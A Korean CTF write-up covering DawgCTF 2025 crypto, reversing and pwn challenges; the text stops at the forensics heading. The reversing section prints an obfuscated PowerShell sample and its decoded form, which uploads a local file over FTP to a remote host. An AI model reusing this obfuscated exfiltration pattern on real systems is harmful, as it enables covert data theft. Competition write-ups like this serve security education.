---
title: "[DawgCTF 2025] Writeup"
description: 2025 DawgCTF Writeup
date: 2025-04-21 03:04:00 +0900
categories: [Security, CTF]
tags: [CTF, writeup]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false
---

---

![Image](https://blog.kakaocdn.net/dn/bj0pHY/btsNsh8h8nY/ZUTkqT9EtZi0UbKpWCZRnK/img.png)

---

2025.04.19 01:00 - 2025.04.21 01:00 (KST)  
**Solo** Team  
4175 Points   
**190th** / 760 teams  

<https://github.com/UMBCCyberDawgs/dawgctf-sp25>  
<br>

---

#### Solved (~~Cancel Lines~~ are Basic Challs with no writeup)

* **Cryptography**
    + The Birds
    + Baby RSA1
    + Baby RSA2
    + Cantor’s Pairadox
* **Reverse Engineering**
    + Suspicious script
    + ShinyClean™ Rust Remover: Budget Edition
* **PWN**
    + Intern’s Project
* **Fwn**
    + Keeping on Schedule
    + Just Packets
* **Misc**
    + ~~Challenge Files?~~
    + ~~Discord Challenge~~
    + ~~Don’t Forget About the Hints!~~
    + Don’t Touch My Fone
    + Mystery Signal I
    + Spectral Secrets
* **OSINT**
    + Es ist alless in Butter
    + GEOSINT - chall1 - Easy
    + GEOSINT - chall3 - Easy
    + GEOSINT - chall4- Easy
    + GEOSINT - chall5 - Easy
    + GEOSINT - chall7 - Medium
    + GEOSINT - chall8 - Medium
    + GEOSINT - chall9 - Medium
    + GEOSINT - chall11 - Hard
    + GEOSINT - chall12 - Hard
  
<br>

---

## **Cryptography**

### The Birds

You think you're being watched, and you see a suspicious flock of birds on the powerlines outside of your house each morning. You think the feds are trying to tell you something. Separate words with underscores and encase in DawgCTF{}. All lowercase.  
<br>

---

![Image](https://blog.kakaocdn.net/dn/BtbZ0/btsNskDX7Ze/5G7ytOlPPIyvjCZO3cARmK/img.png)

새 사진이 주어진다  
<br>

---

![Image](https://blog.kakaocdn.net/dn/ui4l4/btsNrXibIse/koWksesz0c8Ej3A258KRgk/img.png)

[birds-on-a-wire cipher](https://www.dcode.fr/birds-on-a-wire-cipher)  

`DawgCTF{THEREISNOESCAPE}`  
<br>

---

### Baby RSA1

You think your Algebra skills are pretty good huh? Well let's test it out.  
<br>

---

```python
from Crypto.Util.number import *
from sage.all import randint

p = getPrime(512)
q = getPrime(512)
N = p * q

e = 0x10001

m = bytes_to_long(b"DawgCTF{fake\_flag}")

c = pow(m, e, N)

print("N =", N)
print("e =", e)
print("ct =", c)
print()

a = randint(0, 2**100)
b = randint(0, 2**100)
c = randint(0, 2**100)
d = randint(0, 2**100)

x = a * p + b * q
y = c * p + d * q

print("a =", a)
print("b =", b)
print("c =", c)
print("d =", d)
print()
print("x =", x)
print("y =", y)
```

---

```python
from Crypto.Util.number import *
from sympy import Matrix

e = 0x10001

N = 82012538447359821165849738352756467719053530066892750177578020351019136006996881441650616631012602654920370573185549134046659875914860421394782338722082599261391182262036434549525388081948429632803770833590739702562845306267418403878169267641023564108136843672261999376998284926318313315387819024961709097101
e = 65537
ct = 16978597269030388872549064541934623430749704732655891928833779185083334396093332647023718343748730349576361193985691953617733288330780060179716905267988202710452028943623598185277149645724247199640730959820455032298145782015884558972868277752456856802145299858618876838286795962548300080924547387662096543717

a = 149738867837230590596162146900
b = 743799113257239690478459408953
c = 351498883480247386367558572595
d = 1175770398223262147164171561358

x = 6836728736678282915469852947219518538837808913380425472016857154639492051766923345186030197640091719641785981050969319578519968972834509899732176840511342124020344870655741074618585883
y = 12203451977234755811396526665700561863946871005728263879373008871704520841041885029745864562375412192520795388389509063064717933869698154304534842876137996238014648925041725231457010083

M = Matrix([[a, b], [c, d]])
rhs = Matrix([x, y])

pq = M.inv() * rhs
p, q = [int(val) for val in pq]

assert p * q == N

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(ct, d, N)

flag = long_to_bytes(m)
print(flag)

# DawgCTF{wh0\_s41d\_m4th\_15\_us3l3ss?}
```

선형 연립 방정식을 이용해 풀이  
<br>

---

### Baby RSA2

If all I have to do is keep my factors p and q secret, then I can save computation time by sharing the same modulus between all my friends. I'll give them unique e and d pairs to encrypt and decrypt messages. Sounds secure to me!  
<br>

---

```python
from Crypto.Util.number import *
from secret import flag

# This is my stuff! Don't look at it
p = getPrime(512)
q = getPrime(512)
N = p * q

e_priv = 0x10001
phi = (p - 1) * (q - 1)

d_priv = inverse(e_priv, phi)

m = bytes_to_long(flag)
c = pow(m, e_priv, N)

# This is your stuff!
e_pub = getPrime(16)

d_pub = inverse(e_pub, phi)

print(f"e = {e\_pub}")
print(f"d = {d\_pub}")
print(f"N = {N}")
print(f"c = {c}")
```
  
<br>

---

```python
from Crypto.Util.number import *
from math import isqrt

e = 58271
d = 16314065939355844497428646964774413938010062495984944007868244761330321449198604198404787327825341236658059256072790190934480082681534717838850610633320375625893501985237981407305284860652632590435055933317638416556532857376955427517397962124909869006289022084571993305966362498048396739334756594170449299859
N = 119082667712915497270407702277886743652985638444637188059938681008077058895935345765407160513555112013190751711213523389194925328565164667817570328474785391992857634832562389502866385475392702847788337877472422435555825872297998602400341624700149407637506713864175123267515579305109471947679940924817268027249
c = 107089582154092285354514758987465112016144455480126366962910414293721965682740674205100222823439150990299989680593179350933020427732386716386685052221680274283469481350106415150660410528574034324184318354089504379956162660478769613136499331243363223860893663583161020156316072996007464894397755058410931262938

kphi = d * e - 1

for k in range(1, 2**20):
    if kphi % k != 0:
        continue
    phi = kphi // k
    a = 1
    b = -(N - phi + 1)
    c_eq = N
    discriminant = b*b - 4*a*c_eq

    if discriminant < 0:
        continue

    sqrt_disc = isqrt(discriminant)
    if sqrt_disc * sqrt_disc != discriminant:
        continue

    p = (-b + sqrt_disc) // 2
    q = (-b - sqrt_disc) // 2

    if p * q == N:
        print("[*] Success: Found p, q")
        phi = (p - 1)*(q - 1)
        d_priv = inverse(0x10001, phi)
        m = pow(c, d_priv, N)
        print(long_to_bytes(m))
        break

# DawgCTF{kn0w1ng\_d\_1s\_kn0w1ng\_f4ct0rs}
```
  
<br>

---

### Cantor’s Pairadox

Now that I have encrypted my flag with a new math function I was just researching I can know share it with my friend Cantor and no one will know how to read it except us!  
<br>

---

```python
from sage.all import sqrt, floor
from secret import flag

def getTriNumber(n):
    return n * (n + 1) // 2  # Ensure integer division

def pair(n1, n2):
    S = n1 + n2
    return getTriNumber(S) + n2

def pair_array(arr):
    result = []
    for i in range(0, len(arr), 2):
        result.append(pair(arr[i], arr[i + 1]))
    return result

def pad_to_power_of_two(arr):
    result = arr
    n = len(result)
    while (n & (n - 1)) != 0:
        result.append(0)
        n += 1
    return result

flag = [ord(f) for f in flag]
flag = pad_to_power_of_two(flag)

temp = flag
for i in range(6):
temp = pair_array(temp)

print("Encoded:", temp)
```
  
<br>

---

```python
from math import isqrt, floor

def getTriRoot(z):
    w = floor((-1 + isqrt(1 + 8 * z)) // 2)
    return int(w)

def unpair(z):
    w = getTriRoot(z)
    t = w * (w + 1) // 2
    b = z - t
    a = w - b
    return (a, b)

def unpair_array(arr):
    result = []
    for val in arr:
        a, b = unpair(val)
        result.extend([a, b])
    return result

encoded = [4036872197130975885183239290191447112180924008343518098638033545535893348884348262766810360707383741794721392226291497314826201270847784737584016]

temp = encoded
for i in range(6):
    temp = unpair_array(temp)

while temp and temp[-1] == 0:
    temp.pop()

flag = ''.join(chr(x) for x in temp)
print("Decoded flag:", flag)

# Dawg{1\_pr3f3r\_4ppl3s\_t0\_pa1rs\_4nyw2y5}
```
  
<br>

---

## **Reverse Engineering**

### Suspicious script

I was on a site looking for homework help. They offer this tool that I installed and they suggest running it to help solve my assignment. The file ends in .ps1 and I am unfamiliar with it. Can you check it out for me?

The flag starts with DawgCTF{...}  
<br>

---

```powershell
$6=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbaSe64stRIng('JAB7ACEAfQA9AFsAQwBIAGEAcgBdADEAMAA1ADsAJABhAD0AWwBTAHkAUwBUAEUAbQAuAHQARQBYAHQALgBFAG4AQwBvAEQAaQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQARQAuAGcARQB0AFMAdABSAGkAbgBnACgAWwBjAG8ATgBWAGUAcgBUAF0AOgA6AEYAcgBPAG0AYgBhAHMAZQA2ADQAcwB0AFIASQBuAGcAKAAnAGYAUQBCADAAQQBHAGsAQQBlAEEAQgBsAEEASABzAEEAYQBBAEIAagBBAEgAUQBBAFkAUQBCAGoAQQBIADAAQQBPAHcAQQBwAEEARQBZAEEASgBBAEEAZwBBAEMAdwBBAGEAUQBCAHkAQQBIAFUAQQBKAEEAQQBvAEEARwBVAEEAYgBBAEIAcABBAEUAWQBBAFoAQQBCAGgAQQBHADgAQQBiAEEAQgB3AEEARgBVAEEATABnAEIAcwBBAEcATQBBAGQAdwBBAGsAQQBEAHMAQQBjAEEAQgAwAEEARwBZAEEASgBBAEEAZwBBAEgAUQBBAGMAdwBCAHAAQQBFAHcAQQBkAEEAQgB1AEEARwBVAEEAYgBRAEIAMQBBAEcAYwBBAGMAZwBCAEIAQQBDADAAQQBJAEEAQgBwAEEASABJAEEAVgBRAEEAdQBBAEcAMABBAFoAUQBCADAAQQBIAE0AQQBlAFEAQgBUAEEAQwBBAEEAWgBRAEIAdABBAEcARQBBAFQAZwBCAGwAQQBIAEEAQQBlAFEAQgBVAEEAQwAwAEEASQBBAEIAMABBAEcATQBBAFoAUQBCAHEAQQBHAEkAQQBUAHcAQQB0AEEASABjAEEAWgBRAEIATwBBAEQAMABBAGEAUQBCAHkAQQBIAFUAQQBKAEEAQQA3AEEASABRAEEAYgBnAEIAbABBAEcAawBBAGIAQQBCAEQAQQBHAEkAQQBaAFEAQgBYAEEAQwA0AEEAZABBAEIAbABBAEUANABBAEwAZwBCAHQAQQBHAFUAQQBkAEEAQgB6AEEASABrAEEAVQB3AEEAZwBBAEcAVQBBAA0ACgBiAFEAQgBoAEEARQA0AEEAWgBRAEIAdwBBAEgAawBBAFYAQQBBAHQAQQBDAEEAQQBkAEEAQgBqAEEARwBVAEEAYQBnAEIAaQBBAEUAOABBAEwAUQBCADMAQQBHAFUAQQBUAGcAQQA5AEEARwB3AEEAWQB3AEIAMwBBAEMAUQBBAE8AdwBBAGkAQQBIAEEAQQBhAFEAQgA2AEEAQwA0AEEAYwB3AEIAegBBAEcARQBBAGMAQQBBAHYAQQBHADQAQQBhAFEAQQB2AEEASAAwAEEASQBRAEEAMQBBAEgAUQBBAGMAQQBBAHgAQQBHAE0AQQBOAFEAQgBmAEEARwBRAEEAWgBRAEIAdwBBAEgAQQBBAE4AQQBCAHkAQQBGAGMAQQBlAHcAQgBHAEEARgBRAEEAUQB3AEIAbgBBAEgAYwBBAFkAUQBCAEUAQQBFAEEAQQBlAFEAQgB5AEEARwBFAEEAWQB3AEIAegBBAEQAbwBBAGMAZwBCAGwAQQBIAE0AQQBkAFEAQQB2AEEAQwA4AEEATwBnAEIAdwBBAEgAUQBBAFoAZwBBAGkAQQBEADAAQQBjAEEAQgAwAEEARwBZAEEASgBBAEEANwBBAEQAWQBBAE0AUQBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE0AQQBBAHkAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBADIAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAFkAQQANAAoATgBBAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQByAEEARABVAEEATQBnAEEAeABBAEYAMABBAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATgBnAEEAeABBAEQARQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEAeQBBAEQARQBBAE0AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQAawBBAE4AQQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQAUQBBAE0AUQBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE8AUQBBADUAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE0AdwBBADEAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBADUAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBAHgAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBAHkAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAFUAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEEAQQBNAEEAQQB4AEEARgAwAEEADQAKAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATQBRAEEAMQBBAEYAMABBAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATQBBAEEAdwBBAEQARQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEANABBAEQAUQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEANQBBAEQAawBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEAdwBBAEQARQBBAE0AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQARQBBAE4AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQATQBBAE0AZwBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBAHgAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBADUAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAGMAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEEAQQBPAEEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEkAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAA0ACgBXAHcAQQByAEEARABnAEEATgBRAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQByAEEARABjAEEATgBnAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQA5AEEARQBZAEEASgBBAEIANwBBAEgAawBBAGMAZwBCADAAQQBBAD0APQAnACkAKQA7ACQAewBAAH0AIAA9ACIAeAAiADsAJABiAD0AJABhAC4AVABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQA7AFsAYQByAFIAYQBZAF0AOgA6AHIARQBWAGUAcgBTAGUAKAAkAGIAKQA7ACgAJABiACAALQBKAG8ASQBuACAAIgAiACkAIAB8ACAAJgAoACIAJAB7ACEAfQBlACQAewBAAH0AIgApAA=='))
& ([char]105+[char]101+[char]120) $6
```

`ps1` 확장자를 가지는데 파워쉘 실행 파일이라고 한다
실제로 실행하면 그냥 깜빡였다가 바로 사라진다

`frombase64string`이 있는 것으로 보아 저 문자열을 base64 디코딩 하고 105, 101, 120 아스키 문자들을 붙여주면 될 것 같다  
<br>

---

```powershell
${!}=[CHar]105;$a=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbase64stRIng('fQB0AGkAeABlAHsAaABjAHQAYQBjAH0AOwApAEYAJAAgACwAaQByAHUAJAAoAGUAbABpAEYAZABhAG8AbABwAFUALgBsAGMAdwAkADsAcAB0AGYAJAAgAHQAcwBpAEwAdABuAGUAbQB1AGcAcgBBAC0AIABpAHIAVQAuAG0AZQB0AHMAeQBTACAAZQBtAGEATgBlAHAAeQBUAC0AIAB0AGMAZQBqAGIATwAtAHcAZQBOAD0AaQByAHUAJAA7AHQAbgBlAGkAbABDAGIAZQBXAC4AdABlAE4ALgBtAGUAdABzAHkAUwAgAGUA
bQBhAE4AZQBwAHkAVAAtACAAdABjAGUAagBiAE8ALQB3AGUATgA9AGwAYwB3ACQAOwAiAHAAaQB6AC4AcwBzAGEAcAAvAG4AaQAvAH0AIQA1AHQAcAAxAGMANQBfAGQAZQBwAHAANAByAFcAewBGAFQAQwBnAHcAYQBEAEAAeQByAGEAYwBzADoAcgBlAHMAdQAvAC8AOgBwAHQAZgAiAD0AcAB0AGYAJAA7ADYAMQAxAF0AcgBhAEgAQwBbACsAMAAyADEAXQByAGEASABDAFsAKwA2ADEAMQBdAHIAYQBIAEMAWwArADYA
NABdAHIAYQBIAEMAWwArADUAMgAxAF0AcgBhAEgAQwBbACsANgAxADEAXQByAGEASABDAFsAKwAyADEAMQBdAHIAYQBIAEMAWwArADkANABdAHIAYQBIAEMAWwArADQAMQAxAF0AcgBhAEgAQwBbACsAOQA5AF0AcgBhAEgAQwBbACsAMwA1AF0AcgBhAEgAQwBbACsANQA5AF0AcgBhAEgAQwBbACsANQAxADEAXQByAGEASABDAFsAKwAyADEAMQBdAHIAYQBIAEMAWwArADUAOQBdAHIAYQBIAEMAWwArADAAMAAxAF0A
cgBhAEgAQwBbACsAMQA1AF0AcgBhAEgAQwBbACsAMAAwADEAXQByAGEASABDAFsAKwA4ADQAXQByAGEASABDAFsAKwA5ADkAXQByAGEASABDAFsAKwAwADEAMQBdAHIAYQBIAEMAWwArADEANQBdAHIAYQBIAEMAWwArADMAMgAxAF0AcgBhAEgAQwBbACsANQAxADEAXQByAGEASABDAFsAKwA5ADEAMQBdAHIAYQBIAEMAWwArADcAOQBdAHIAYQBIAEMAWwArADAAOABdAHIAYQBIAEMAWwArADIAOQBdAHIAYQBIAEMA
WwArADgANQBdAHIAYQBIAEMAWwArADcANgBdAHIAYQBIAEMAWwA9AEYAJAB7AHkAcgB0AA=='));${@} ="x";$b=$a.ToCharArray();[arRaY]::rEVerSe($b);($b -JoIn "") | &("${!}e${@}")
```

같은 파워쉘 스크립트가 또 나왔는데 이번엔 base64디코딩에 reverse까지 붙어있다  
<br>

---

```text
}tixe{hctac};)F$ ,iru$(eliFdaolpU.lcw$;ptf$ tsiLtnemugrA- irU.metsyS emaNepyT- tcejbO-weN=iru$;tneilCbeW.teN.metsyS emaNepyT- tcejbO-weN=lcw$;"piz.ssap/ni/}!5tp1c5\_depp4rW{FTCgwaD@yracs:resu//:ptf"=ptf$;611]raHC[+021]raHC[+611]raHC[+64]raHC[+521]raHC[+611]raHC[+211]raHC[+94]raHC[+411]raHC[+99]raHC[+35]raHC[+59]raHC[+511]raHC[+211]raHC[+59]raHC[+001]raHC[+15]raHC[+001]raHC[+84]raHC[+99]raHC[+011]raHC[+15]raHC[+321]raHC[+511]raHC[+911]raHC[+79]raHC[+08]raHC[+29]raHC[+85]raHC[+76]raHC[=F${yrt
```

```text
try{$F=[CHar]67+[CHar]58+[CHar]92+[CHar]80+[CHar]97+[CHar]119+[CHar]115+[CHar]123+[CHar]51+[CHar]110+[CHar]99+[CHar]48+[CHar]100+[CHar]51+[CHar]100+[CHar]95+[CHar]112+[CHar]115+[CHar]95+[CHar]53+[CHar]99+[CHar]114+[CHar]49+[CHar]112+[CHar]116+[CHar]125+[CHar]46+[CHar]116+[CHar]120+[CHar]116;$ftp="ftp://user:scary@DawgCTF{Wr4pped\_5c1pt5!}/in/pass.zip";$wcl=New-Object -TypeName System.Net.WebClient;$uri=New-Object -TypeName System.Uri -ArgumentList $ftp;$wcl.UploadFile($uri, $F);}catch{exit}
```

문자열을 base64디코딩한 후 아스키 문자들을 붙이고 reverse를 해주면 그 사이에 플래그가 끼워져있다

`DawgCTF{Wr4pped_5c1pt5!}`  
<br>

---

### ShinyClean™ Rust Remover: Budget Edition

ShinyClean™ Rust Remover is having a free car wash give away! Run the program to see if you win!  
<br>

---

```c++
int __fastcall main(int argc, const char **argv, const char **envp)
{
    return std::rt::lang_start::h91ff47afc442db24(shinyclean::main::h4b15dd54e331d693, argc, argv, 0LL);
}
```

IDA 돌려봤는데 C++ 코드인 것 같다  
<br>

---

```c++
__int64 shinyclean::main::h4b15dd54e331d693()
{
  __int64 v1; // [rsp+8h] [rbp-100h]
  _BYTE s[23]; // [rsp+2Ah] [rbp-DEh] BYREF
  _BYTE v3[22]; // [rsp+41h] [rbp-C7h] BYREF
  _BYTE v4[9]; // [rsp+57h] [rbp-B1h] BYREF
  _BYTE v5[48]; // [rsp+60h] [rbp-A8h] BYREF
  _QWORD v6[4]; // [rsp+90h] [rbp-78h] BYREF
  _BYTE v7[48]; // [rsp+B0h] [rbp-58h] BYREF
  _BYTE *v8; // [rsp+E0h] [rbp-28h]
  void *v9; // [rsp+E8h] [rbp-20h]
  _BYTE *v10; // [rsp+F0h] [rbp-18h]
  void *v11; // [rsp+F8h] [rbp-10h]
  _BYTE *v12; // [rsp+100h] [rbp-8h]

  memset(s, 0, sizeof(s));
  qmemcpy(v3, "{^HX|kyDym", 10);
  v3[10] = 12;
  v3[11] = 12;
  v3[12] = 96;
  v3[13] = 124;
  v3[14] = 11;
  v3[15] = 109;
  v3[16] = 96;
  v3[17] = 104;
  v3[18] = 11;
  v3[19] = 10;
  v3[20] = 119;
  v3[21] = 30;
  strcpy(v4, "B");
  v4[2] = 0;
  *(_WORD *)&v4[3] = 0;
  *(_DWORD *)&v4[5] = 0;
  do
  {
    if ( *(_QWORD *)&v4[1] >= 0x17uLL )
      core::panicking::panic_bounds_check::h8307ccead484a122(*(_QWORD *)&v4[1], 23LL, &off_54578);
    s[*(_QWORD *)&v4[1]] = v3[*(_QWORD *)&v4[1]] ^ 0x3F;
    v1 = *(_QWORD *)&v4[1] + 1LL;
    if ( *(_QWORD *)&v4[1] == -1LL )
      core::panicking::panic_const::panic_const_add_overflow::hf2f4fb688348b3b0(&off_545A8);
    ++*(_QWORD *)&v4[1];
  }
  while ( v1 != 23 );
  if ( (unsigned int)std::process::id::hcbcee05e6d949703() == 29485234 )
  {
    v10 = s;
    v11 = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    v12 = s;
    v8 = s;
    v9 = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    v6[2] = s;
    v6[3] = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    v6[0] = s;
    v6[1] = &core::array::_$LT$impl$u20$core..fmt..Debug$u20$for$u20$$u5b$T$u3b$$u20$N$u5d$$GT$::fmt::hf6f6e41e4948d91c;
    core::fmt::Arguments::new_v1::hfac9ebf3d99d1264(v5, &unk_545C0, v6);
    return std::io::stdio::_print::he7d505d4f02a1803(v5);
  }
  else
  {
    core::fmt::Arguments::new_const::hf72ed85907e377bb(v7, &off_545E0);
    return std::io::stdio::_print::he7d505d4f02a1803(v7);
  }
}
```

대충 복호화하는 것처럼 보이는 코드이다  
<br>

---

```python
encrypted = [
ord(c) for c in "{^HX|kyDym"
] + [12, 12, 96, 124, 11, 109, 96, 104, 11, 10, 119, 30]

decrypted = ''.join(chr(b ^ 0x3F) for b in encrypted)
print(decrypted)

# DawgCTF{FR33\_C4R\_W45H!
```
  
<br>

---

## **Pwn**

### Interns’ Project

Our interns put together a little test program for us. It seems they all might have patched together their separate projects. Could you test it out for me?

nc [connect.umbccd.net](http://connect.umbccd.net/) 20011  
<br>

---

![Image](https://blog.kakaocdn.net/dn/Di3q6/btsNtrVZhso/f57yvvEuPpYKQV42REwKZk/img.png)

옵션 세 가지가 있는데 2번으로 플래그를 뽑으려 하면 루트 권한이 필요하다  
<br>

---

```c++
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rdx
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rax
  __int64 v8; // rdx
  __int64 v9; // rax
  __int64 v10; // rdx
  __int64 v11; // rax
  __int64 v12; // rdx
  __int64 v13; // rax

  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Welcome to our intern's test project!", envp);
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  while ( 1 )
  {
    std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>);
    v5 = std::operator<<<std::char_traits<char>>(&std::cout, "The following are your options:", v4);
    std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
    v7 = std::operator<<<std::char_traits<char>>(&std::cout, "   1. Say hi", v6);
    std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
    v9 = std::operator<<<std::char_traits<char>>(&std::cout, "   2. Print the flag", v8);
    std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
    v11 = std::operator<<<std::char_traits<char>>(&std::cout, "   3. Create an account", v10);
    std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
    v13 = std::operator<<<std::char_traits<char>>(&std::cout, "Enter option (1-3). Press Enter to submit:", v12);
    std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
    handleOption();
  }
}
```

pwngdb로 하려다가 함수 이름이랑 plt 이름 랄나길래 그냥 IDA에 바로 올려봤는데 이것도 C++인 것 같다  
<br>

---

```c++
unsigned __int64 handleOption(void)
{
  int v0; // eax
  __int64 v1; // rax
  __int64 v2; // rax
  _QWORD *v3; // rax
  __int64 v4; // rdx
  __int64 v7; // rax
  int v9; // [rsp+4h] [rbp-5CCh] BYREF
  int v10; // [rsp+8h] [rbp-5C8h]
  int i; // [rsp+Ch] [rbp-5C4h]
  _BYTE v12[32]; // [rsp+10h] [rbp-5C0h] BYREF
  _BYTE v13[384]; // [rsp+30h] [rbp-5A0h] BYREF
  _DWORD v14[258]; // [rsp+1B0h] [rbp-420h]
  unsigned __int64 v15; // [rsp+5B8h] [rbp-18h]

  v15 = __readfsqword(0x28u);
  v10 = 0;
  std::string::basic_string(v12);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v12);
  std::istringstream::basic_istringstream(v13, v12, 8LL);
  while ( 1 )
  {
    v3 = (_QWORD *)std::istream::operator>>(v13, &v9);
    if ( !(unsigned __int8)std::ios::operator bool((char *)v3 + *(_QWORD *)(*v3 - 24LL)) || v10 > 255 )
      break;
    if ( v9 <= 0 || v9 > 3 )
    {
      v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Ignoring invalid option: ", v4);
      v2 = std::ostream::operator<<(v1, (unsigned int)v9);
      std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
    }
    else
    {
      v0 = v10++;
      v14[v0] = v9;
    }
  }
  if ( v14[0] == 2 && geteuid() )
  {
    v7 = std::operator<<<std::char_traits<char>>(&std::cout, "Error: Option 2 requires root privileges HAHA", v4);
    std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  }
  else
  {
    for ( i = 0; i < v10; ++i )
    {
      switch ( v14[i] )
      {
        case 1:
          sayHello();
          break;
        case 2:
          printFlag();
          break;
        case 3:
          login();
          break;
      }
    }
  }
  std::istringstream::~istringstream(v13);
  std::string::~string(v12);
  return v15 - __readfsqword(0x28u);
}
```

한번에 여러 옵션을 입력할 수 있는데 `geteuid()`로 루트 검증을 옵션 배열의 첫 번째 인덱스 값만 하기 때문에 한번에 여러 옵션을 주면 루트 검증 없이 `printFlag()`를 할 수 있게 된다

---  
<br>

```c++
unsigned __int64 login(void)
{
  __int64 v0; // rdx
  __int64 v1; // rdx
  __int64 v2; // rdx
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rdx
  __int64 v8; // rax
  _BYTE v10[32]; // [rsp+0h] [rbp-60h] BYREF
  _BYTE v11[40]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v12; // [rsp+48h] [rbp-18h]

  v12 = __readfsqword(0x28u);
  std::string::basic_string(v10);
  std::string::basic_string(v11);
  std::operator<<<std::char_traits<char>>(&std::cout, "Enter username: ", v0);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v10);
  std::operator<<<std::char_traits<char>>(&std::cout, "Enter password: ", v1);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v11);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "You entered username: ", v2);
  v4 = std::operator<<<char>(v3, v10);
  v5 = std::operator<<<std::char_traits<char>>(v4, " and password: ", v4);
  v6 = std::operator<<<char>(v5, v11);
  std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  v8 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "However I was just hired and have not learned how to use a database yet....",
         v7);
  std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  std::string::~string(v11);
  std::string::~string(v10);
  return v12 - __readfsqword(0x28u);
}
```

참고로 `login()`에는 별다른 기능은 없는 것 같다..  
<br>

---

![Image](https://blog.kakaocdn.net/dn/zJyoi/btsNti53Ak9/Y29hEpiV1TP7f9AI4vP1Kk/img.png)  
<br>

---

## **Fwn (Forensics)**

### Keeping on Schedule

